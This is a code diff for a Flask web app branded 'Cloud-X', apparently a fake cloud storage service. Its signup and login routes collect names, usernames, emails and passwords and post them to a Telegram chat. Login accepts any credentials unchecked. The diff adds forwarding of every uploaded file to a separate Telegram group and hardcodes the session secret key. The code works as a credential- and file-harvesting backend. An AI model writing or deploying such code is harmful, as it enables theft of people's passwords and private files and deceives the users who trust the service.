@@ -1,21 +1,25 @@
 import os
 import requests
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
+app.secret_key = 'cloud-x-secret-key-security'
 
-# Render-এর Environment Variable থেকে টেলিগ্রাম টোকেন ও চ্যাট আইডি রিড করবে
+# টেলিগ্রাম বট টোকেন
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+
+# ১. লগইন/সাইনআপ ডেটা যাওয়ার চ্যাট আইডি
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# ফাইল আপলোড ফোল্ডার ও ফরম্যাট কনফিগারেশন
+# ২. ফাইল বা মিডিয়া স্টোর হওয়ার আলাদা গ্রুপ/চ্যাট আইডি 
+# (যদি আলাদা ভ্যারিয়েবল না দিয়ে সরাসরি গ্রুপের আইডি বসাতে চান, তবে সরাসরি এখানে মাইনাসসহ লিখে দিতে পারেন যেমন: "-100xxxxxxxxxx")
+TELEGRAM_UPLOAD_CHAT_ID = os.getenv("TELEGRAM_UPLOAD_CHAT_ID", TELEGRAM_CHAT_ID)
+
 UPLOAD_FOLDER = 'uploads'
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
-
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-# ফোল্ডার না থাকলে অটো তৈরি হবে
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
@@ -26,26 +30,27 @@ def allowed_file(filename):
 def index():
     return render_template('index.html')
 
-# লগইন পেজ দেখানোর রাউট
 @app.route('/login-page')
 def login_page():
     return render_template('login.html')
 
-# ড্যাশবোর্ড পেজ দেখানোর রাউট
 @app.route('/dashboard')
 def dashboard():
-    return render_template('dashboard.html')
+    if 'username' not in session:
+        return redirect(url_for('login_page'))
+    
+    return render_template('dashboard.html', 
+                           username=session.get('username'), 
+                           email=session.get('email'))
 
 @app.route('/signup', methods=['POST'])
 def signup():
     data = request.get_json()
-    
     full_name = data.get('full_name')
     username = data.get('username')
     email = data.get('email')
     password = data.get('password')
 
-    # টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট (সাইনআপ)
     telegram_message = (
         f"🚨 *New Cloud-X Registration* 🚨\n\n"
         f"👤 *Full Name:* {full_name}\n"
@@ -56,11 +61,7 @@ def signup():
     )
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": telegram_message,
-        "parse_mode": "Markdown"
-    }
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"}
 
     try:
         response = requests.post(url, json=payload)
@@ -71,16 +72,16 @@ def signup():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-# লগইন ডেটা প্রসেস ও টেলিগ্রামে পাঠানোর রাউট
 @app.route('/login', methods=['POST'])
 def login():
     data = request.get_json()
-    
     username = data.get('username')
     email = data.get('email')
     password = data.get('password')
 
-    # টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট (লগইন)
+    session['username'] = username
+    session['email'] = email
+
     telegram_message = (
         f"🔐 *Cloud-X User Login Attempt* 🔐\n\n"
         f"🔖 *Username:* {username}\n"
@@ -90,11 +91,7 @@ def login():
     )
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": telegram_message,
-        "parse_mode": "Markdown"
-    }
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"}
 
     try:
         response = requests.post(url, json=payload)
@@ -105,7 +102,7 @@ def login():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-# ফাইল আপলোড হ্যান্ডেল করার রাউট
+# ফাইল আপলোড এবং আলাদা গ্রুপে পাঠানোর রাউট
 @app.route('/upload', methods=['POST'])
 def upload_file():
     if 'file' not in request.files:
@@ -117,8 +114,27 @@ def upload_file():
     
     if file and allowed_file(file.filename):
         filename = secure_filename(file.filename)
-        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-        return jsonify({"status": "success", "message": "File uploaded successfully", "filename": filename})
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(filepath)
+        
+        current_user = session.get('username', 'Unknown User')
+
+        # এখানে TELEGRAM_UPLOAD_CHAT_ID ব্যবহার করা হয়েছে, যা ফাইল স্টোর করার আলাদা গ্রুপে পাঠাবে
+        tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        with open(filepath, 'rb') as f:
+            files = {'document': f}
+            data = {
+                "chat_id": TELEGRAM_UPLOAD_CHAT_ID, 
+                "caption": f"📁 *New Media Stored in Cloud-X*\n👤 *User:* {current_user}\n📄 *File Name:* {filename}",
+                "parse_mode": "Markdown"
+            }
+            requests.post(tg_url, data=data, files=files)
+
+        return jsonify({
+            "status": "success", 
+            "message": "File uploaded and stored in Telegram group", 
+            "filename": filename
+        })
     
     return jsonify({"status": "error", "message": "File type not allowed"})
 
